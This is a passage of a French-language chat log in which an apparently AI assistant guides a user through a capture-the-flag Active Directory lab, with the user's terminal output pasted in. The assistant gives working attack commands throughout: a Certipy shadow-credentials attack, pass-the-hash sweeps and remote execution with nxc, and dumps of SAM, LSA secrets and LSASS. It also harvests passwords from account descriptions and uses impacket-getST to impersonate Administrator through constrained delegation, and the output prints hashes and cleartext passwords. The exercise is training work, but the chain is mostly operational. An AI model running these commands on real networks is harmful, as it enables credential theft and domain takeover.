    "PrincipalType": "User"
}
L'utilisateur possédant le SID se terminant par -1184 a le droit critique AddKeyCredentialLink sur k.cheh.

Maintenant, si l'on cherche qui est ce fameux -1184 dans ton fichier, on tombe sur... A.NOZER !
Or, souviens-toi : nous connaissons le mot de passe de a.nozer depuis le début (C3L3stin4!Us3r) !

Qu'est-ce que l'attaque "Shadow Credentials" ?
Le droit AddKeyCredentialLink permet à a.nozer d'ajouter un certificat cryptographique "dans l'ombre" (d'où le nom de l'attaque) sur le compte de k.cheh. Une fois ce certificat injecté, l'Active Directory va croire que a.nozer est légitime pour demander un ticket Kerberos (TGT) au nom de k.cheh, ce qui permet d'extraire son mot de passe (hash NT) sans jamais le modifier !

L'attaque finale
Puisque tu es sur Exegol, tu as accès à un outil formidable appelé Certipy qui automatise toute cette attaque (injection du certificat, demande du ticket, extraction du hash et nettoyage des traces).

Lance cette commande magique :

Bash
certipy shadow auto -u a.nozer@celestina.shop -p 'C3L3stin4!Us3r' -account k.cheh -target dc-celestina.celestina.shop
(Note : Si Certipy n'est pas appelé comme ça sur ta version d'Exegol, tu peux utiliser certipy-ad shadow ...)

Regarde bien le terminal s'animer. À la fin, Certipy devrait te recracher le hash NT de l'utilisateur k.cheh. Dès que tu l'as, donne-le-moi, et nous verrons si k.cheh est notre ticket d'entrée pour la suite !

[May 18, 2026 - 11:06:03 (CEST)] exegol-free /workspace # certipy shadow auto -u a.nozer@celestina.shop -p 'C3L3stin4!Us3r' -account k.cheh -target dc-celestina.celestina.shop

Certipy v5.0.4 - by Oliver Lyak (ly4k)



[*] Targeting user 'k.cheh'

[*] Generating certificate

[*] Certificate generated

[*] Generating Key Credential

[*] Key Credential generated with DeviceID 'edfb165679db4bcfab7460f87ea5691b'

[*] Adding Key Credential with device ID 'edfb165679db4bcfab7460f87ea5691b' to the Key Credentials for 'k.cheh'

[*] Successfully added Key Credential with device ID 'edfb165679db4bcfab7460f87ea5691b' to the Key Credentials for 'k.cheh'

[*] Authenticating as 'k.cheh' with the certificate

[*] Certificate identities:

[*]     No identities found in this certificate

[*] Using principal: 'k.cheh@celestina.shop'

[*] Trying to get TGT...

[*] Got TGT

[*] Saving credential cache to 'k.cheh.ccache'

[*] Wrote credential cache to 'k.cheh.ccache'

[*] Trying to retrieve NT hash for 'k.cheh'

[*] Restoring the old Key Credentials for 'k.cheh'

[*] Successfully restored the old Key Credentials for 'k.cheh'

[*] NT hash for 'k.cheh': 2b96340904f32f7888a232c79ea37610

C'est une exécution absolument parfaite ! L'attaque Shadow Credentials est l'une des techniques les plus élégantes et redoutables sur les environnements Active Directory modernes, et tu viens de la réussir haut la main.

Certipy a généré un certificat à la volée, l'a poussé sur le compte de k.cheh grâce aux droits de a.nozer, a demandé un ticket en son nom, extrait son hash, puis a nettoyé ses traces ni vu ni connu.

Et voici la récompense : le hash NT de k.cheh est 2b96340904f32f7888a232c79ea37610.

L'heure de vérité : Le Pass-The-Hash
Nous avons un nouveau compte, on retourne donc à notre procédure standard d'expansion. On va tester ce hash sur tout le parc informatique pour voir où k.cheh est Administrateur Local. Contrairement au Pass-The-Ticket, le Pass-The-Hash (qui utilise NTLM) fonctionne très bien avec les adresses IP.

Lance cette commande :

Bash
nxc smb 10.13.37.0/24 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610'
Ouvre l'œil ! Dès que tu vois un (Pwn3d!) s'afficher à côté d'une machine, tu sais exactement quoi faire : relance la commande sur cette machine cible en ajoutant -x 'ipconfig' à la fin.

Dis-moi vite si tu as enfin trouvé la passerelle vers notre réseau secret 10.37.13.0/24 !

[May 18, 2026 - 11:16:38 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610'

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

BINGO ! Encore une fois, la persévérance a payé.

Si tu regardes la ligne concernant la machine WK-044 (10.13.37.44), tu peux voir le tag tant convoité :
[+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)

L'utilisateur k.cheh est Administrateur Local de la machine WK-044.

Vérifier si c'est le Pivot
On ne perd pas nos bonnes habitudes. Dès qu'on est administrateur sur une nouvelle machine, on vérifie ses cartes réseau pour voir si elle est connectée au fameux réseau secret 10.37.13.0/24.

Lance cette commande pour exécuter ipconfig spécifiquement sur WK-044 avec ton nouveau hash :

Bash
nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -x 'ipconfig'
Croisons les doigts, c'est peut-être enfin notre passerelle ! Dis-moi ce que te renvoie cette commande.

[May 18, 2026 - 11:17:26 (CEST)] exegol-free /workspace # nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -x 'ipconfig'

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)

SMB         10.13.37.44     445    WK-044           [+] Executed command via wmiexec

SMB         10.13.37.44     445    WK-044           Windows IP Configuration

SMB         10.13.37.44     445    WK-044           Ethernet adapter Ethernet0 2:

SMB         10.13.37.44     445    WK-044              Connection-specific DNS Suffix  . :

SMB         10.13.37.44     445    WK-044              Link-local IPv6 Address . . . . . : fe80::fd03:f542:363e:2c73%7

SMB         10.13.37.44     445    WK-044              IPv4 Address. . . . . . . . . . . : 10.13.37.44

SMB         10.13.37.44     445    WK-044              Subnet Mask . . . . . . . . . . . : 255.255.255.0

SMB         10.13.37.44     445    WK-044              Default Gateway . . . . . . . . . : 10.13.37.1

Encore un coup d'épée dans l'eau pour le pivot ! Le retour de la commande ipconfig est sans appel : WK-044 ne possède qu'une seule carte réseau sur la plage 10.13.37.X.

Ce n'est donc toujours pas notre passerelle secrète.

Cependant, tu connais la règle d'or maintenant : Nouvelle machine compromise = Nouveau pillage de credentials ! Puisque nous sommes Administrateur Local sur WK-044, nous allons fouiller ses bases de données et sa mémoire vive (LSASS) pour voir si un autre utilisateur plus privilégié ne s'y serait pas connecté récemment.

Lance ces trois commandes l'une après l'autre pour vider complètement WK-044 de ses secrets :

1. Extraction de la base SAM (mots de passe locaux) :

Bash
nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' --sam
2. Extraction des secrets LSA :

Bash
nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' --lsa
3. Extraction de la mémoire vive (pour des mots de passe en clair ou des tickets Kerberos) :

Bash
nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -M lsassy
Observe attentivement les résultats. Vas-tu trouver de nouveaux hashs, des mots de passe en clair, ou de nouveaux tickets Kerberos (TGT) juteux ? Dis-moi ce qui ressort !

[May 18, 2026 - 11:17:57 (CEST)] exegol-free /workspace # nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' --sam

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)

SMB         10.13.37.44     445    WK-044           [*] Dumping SAM hashes

SMB         10.13.37.44     445    WK-044           Administrator:500:aad3b435b51404eeaad3b435b51404ee:71f14af9da1e0574fec87a153ca23114:::

SMB         10.13.37.44     445    WK-044           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.13.37.44     445    WK-044           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SMB         10.13.37.44     445    WK-044           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:226e3799ac9c5359a8e1a6043278c383:::

SMB         10.13.37.44     445    WK-044           [+] Added 4 SAM hashes to the database

[May 18, 2026 - 11:18:27 (CEST)] exegol-free /workspace # nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' --lsa

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)

SMB         10.13.37.44     445    WK-044           [*] Dumping LSA secrets

SMB         10.13.37.44     445    WK-044           CELESTINA.SHOP/k.cheh:$DCC2$10240#k.cheh#4f535cc9277ce9cdfca83b5fd47bf762: (2024-09-23 09:56:11)

SMB         10.13.37.44     445    WK-044           CELESTINA\WK-044$:aes256-cts-hmac-sha1-96:01b7fb81c27b37461c318e75d711afbe045916ae80125d9041110f818b4a8281

SMB         10.13.37.44     445    WK-044           CELESTINA\WK-044$:aes128-cts-hmac-sha1-96:9579b51607c1cedf53ec920364ae849f

SMB         10.13.37.44     445    WK-044           CELESTINA\WK-044$:des-cbc-md5:7a261aa41f318638

SMB         10.13.37.44     445    WK-044           CELESTINA\WK-044$:plain_password_hex:b5c75f6f60f0b0043a659e494e02cdbfcef08dc6fdd492b4087fe726c8ea63224c4937b2d86b44859125b8225a71be377938f4b7db6b726374dbd662b5ac2bd1a8328eb61897458014b8d4dc2a967ec491dfe250e960fdffa8622cf421e19b2eb5bf623425a760b81f93928c8c4ba19a64d93dc09b8398faae56de522562889e01543f5cabc581137125f5ba371971ff35d7ffe3c83ff1b61c488b61c50d3fbd8881253970dfde4f39b45b3a280c9eae8620ab1959cf427610c27962772ab2406dc4bea543d34750e2cfd15ff5bee5b33a4b11d159ace2109cbdc13e99e70b2eb029354f6018b5b83a7785136b11e074

SMB         10.13.37.44     445    WK-044           CELESTINA\WK-044$:aad3b435b51404eeaad3b435b51404ee:07debc9eeb73369cfc70ce81d031ce77:::

SMB         10.13.37.44     445    WK-044           dpapi_machinekey:0x805f8992d6f3de5fad996abbbed38e56f47f4f6d

dpapi_userkey:0xb952203485c2a35819636fadd8f1698b3592ccf8

Can't open SECURITY\Policy\Secrets\DSREGCMD\CurrVal subKey

SMB         10.13.37.44     445    WK-044           [+] Dumped 7 LSA secrets to /root/.nxc/logs/lsa/WK-044_10.13.37.44_2026-05-18_111833.secrets and /root/.nxc/logs/lsa/WK-044_10.13.37.44_2026-05-18_111833.cached

[May 18, 2026 - 11:18:38 (CEST)] exegol-free /workspace # nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -M lsassy

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)



Le dernier reste bloqué

Pas de panique pour lsassy qui reste bloqué, c'est un grand classique du pentest ! L'antivirus de la machine cible (comme Defender) est très probablement en train d'intercepter la lecture du processus critique LSASS en silence, ce qui provoque un "time out" de ton outil. Tu peux faire un simple Ctrl+C pour tuer la commande.

Cependant, il n'y a pas de quoi être déçu, car le premier dump (la base SAM) t'a livré une information absolument cruciale si tu as l'œil vif.

Compare le hash de l'Administrateur local que tu viens de trouver avec celui des machines précédentes :

Sur WK-123 et WK-124 : fafb12f22417628bb6422e9bb8686f5c

Sur WK-044 (ici) : 71f14af9da1e0574fec87a153ca23114

C'est un hash différent ! Cela signifie que le mot de passe de l'Administrateur Local n'est pas le même partout. C'est le signe d'une ségrégation des mots de passe (soit des masters de déploiement différents, soit l'utilisation d'une solution comme LAPS). L'intégration d'une telle sécurité est une excellente pratique quand on conçoit des architectures ou des pipelines DevSecOps, car cela limite justement la propagation des attaques par Pass-The-Hash.

La contre-attaque
Mais "différent" ne veut pas dire "unique". Il y a fort à parier que ce nouveau mot de passe administrateur soit partagé par un groupe spécifique d'autres machines sur le réseau.

Nous allons donc relancer un Pass-The-Hash, mais cette fois-ci avec cette nouvelle empreinte.

Lance ta commande de scan avec le nouveau hash :

Bash
nxc smb 10.13.37.0/24 -u 'Administrator' -H '71f14af9da1e0574fec87a153ca23114' --local-auth
Ouvre bien l'œil ! Y a-t-il une nouvelle machine, que l'on n'a pas encore touchée, qui te renvoie un magnifique (Pwn3d!) ? Si oui, tu connais la routine : on l'attaque avec -x 'ipconfig' !

[May 18, 2026 - 11:18:38 (CEST)] exegol-free /workspace # nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -M lsassy

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cheh:2b96340904f32f7888a232c79ea37610 (admin)

LSASSY      10.13.37.44     445    WK-044           [-] Unable to dump lsass

[May 18, 2026 - 11:19:39 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'Administrator' -H '71f14af9da1e0574fec87a153ca23114' --local-auth

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:WK-010) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:WK-030) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:WK-044) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:WK-020) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:DC-CELESTINA) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:WK-101) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:WK-111) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:WK-202) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:WK-124) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:WK-123) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:WK-137) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:WK-222) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:WK-132) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:WK-155) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:WK-234) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [-] WK-010\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.30     445    WK-030           [-] WK-030\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.44     445    WK-044           [+] WK-044\Administrator:71f14af9da1e0574fec87a153ca23114 (admin)

SMB         10.13.37.20     445    WK-020           [-] WK-020\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.42     445    DC-CELESTINA     [-] DC-CELESTINA\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.101    445    WK-101           [-] WK-101\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.111    445    WK-111           [-] WK-111\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.202    445    WK-202           [-] WK-202\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.124    445    WK-124           [-] WK-124\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.123    445    WK-123           [-] WK-123\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.137    445    WK-137           [-] WK-137\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.222    445    WK-222           [-] WK-222\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.132    445    WK-132           [-] WK-132\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.155    445    WK-155           [-] WK-155\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

SMB         10.13.37.234    445    WK-234           [-] WK-234\Administrator:71f14af9da1e0574fec87a153ca23114 STATUS_LOGON_FAILURE 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 11:20:11 (CEST)] exegol-free /workspace # 

C'est encore un cul-de-sac, mais un cul-de-sac qui nous apprend quelque chose de très important sur la sécurité de ce réseau !

Le mot de passe Administrateur Local de WK-044 (71f1...) est unique. Il ne fonctionne sur aucune autre machine. C'est une excellente pratique de sécurité (probablement gérée par une solution comme LAPS) qui bloque net notre attaque de Pass-The-Hash.

Mais rappelle-toi la règle d'or du pentester : quand la voie technique est bloquée, on cherche l'erreur humaine.

L'erreur humaine (Le challenge à 100 points)
Reprenons ta liste de challenges non résolus. Il y en a un qui s'intitule :
"Décrivez précisement, mais pas trop" (100 pts)
Indice : Certains champs feraient mieux de ne pas être touchés si c'est pour faire fuiter des informations sensibles.

Remonte un peu dans le terminal et regarde attentivement l'énorme fichier users.json que tu as extrait de BloodHound tout à l'heure. Cherche le champ "description" pour les différents utilisateurs... C'est un festival d'erreurs humaines ! L'équipe IT a littéralement stocké des mots de passe temporaires dans la description des comptes Active Directory !

Regarde ça :

k.cedepte : "description": "R3m0t3Pr1v1l3g35@H4nd!"

d.scrip : "description": "ONeT0uGhP4ssW0rdT0CrAcK!"

k.brown : "description": "L3tsMak3S0m3C00k1es!!"

m.jones : "description": "P4ssW0rd1zS3cur3&L0n9"

... et il y en a d'autres !

C'est une faille monumentale qui te permet de valider ce challenge.

La nouvelle piste : K.CEDEPTE
Parmi tous ces utilisateurs fuyards, l'un d'eux est particulièrement intéressant pour nous : k.cedepte.
Si tu regardes son profil dans le JSON, il possède une propriété très spéciale :
"allowedtodelegate": ["HTTP/WK-155"] et "trustedtoauth": true.

Cela sent très fort le prochain challenge ("Libéré, délivré, non contraint" ou une variation de Constrained Delegation).

Mais avant de sortir l'artillerie lourde de Kerberos, faisons les choses dans l'ordre. Vérifions d'abord si ce compte k.cedepte (et son mot de passe tout neuf) ne nous donne pas directement un accès Administrateur sur une machine du réseau.

Lance cette commande pour scanner tout le réseau avec ces nouveaux identifiants :

Bash
nxc smb 10.13.37.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!'
Regarde les résultats : obtiens-tu un [+] vert ? Et surtout, as-tu un (Pwn3d!) qui nous éviterait des manipulations Kerberos complexes, ou bien allons-nous devoir exploiter cette fameuse "délégation" ?

[May 18, 2026 - 11:20:11 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!'

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\k.cedepte:R3m0t3Pr1v1l3g35@H4nd! 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

C'est validé, les identifiants fonctionnent partout ! Mais comme on pouvait s'y attendre, l'utilisateur k.cedepte n'a pas de droits d'administration locale directs (pas de tag admin ni Pwn3d!).

C'est là que la configuration de l'Active Directory devient intéressante. C'est l'heure d'attaquer le challenge à 400 points : "Libéré, délivré, non contraint".

Comme tu l'as vu dans BloodHound, le compte k.cedepte a le droit d'utiliser la Délégation Contrainte (Constrained Delegation) vers la machine WK-155. Plus précisément, il a le droit msDS-AllowedToDelegateTo configuré avec HTTP/WK-155.

Qu'est-ce que l'attaque par Délégation Contrainte ?
La délégation contrainte permet à un compte (ici k.cedepte) d'usurper l'identité de n'importe quel utilisateur du domaine (y compris un Administrateur du Domaine) pour s'authentifier auprès d'un service spécifique (ici le service HTTP ou cifs sur WK-155). On utilise pour cela les extensions Kerberos S4U2self et S4U2proxy.

Puisque nous voulons prendre le contrôle de WK-155, nous allons demander un ticket de service (cifs/WK-155.celestina.shop) en usurpant l'identité de l'utilisateur Administrator.

L'attaque avec Impacket
Nous allons utiliser l'outil impacket-getST (disponible sur ton Exegol) pour générer ce ticket frauduleux. L'outil va utiliser le mot de passe de k.cedepte pour demander un ticket pour Administrator vers WK-155.

Lance cette commande :

Bash
impacket-getST -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
Charger et utiliser le ticket
Si la commande réussit, elle va générer un fichier .ccache (par exemple Administrator.ccache). Il te suffira ensuite de l'injecter dans ton terminal et de tester si tu obtiens enfin les droits complets sur la machine cible !

Injecte le ticket généré :

Bash
export KRB5CCNAME="Administrator.ccache"
Vérifie avec NetExec (en mode Kerberos complet) :

Bash
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache
Faisons chauffer la délégation Kerberos ! Donne-moi le retour de la commande impacket-getST.

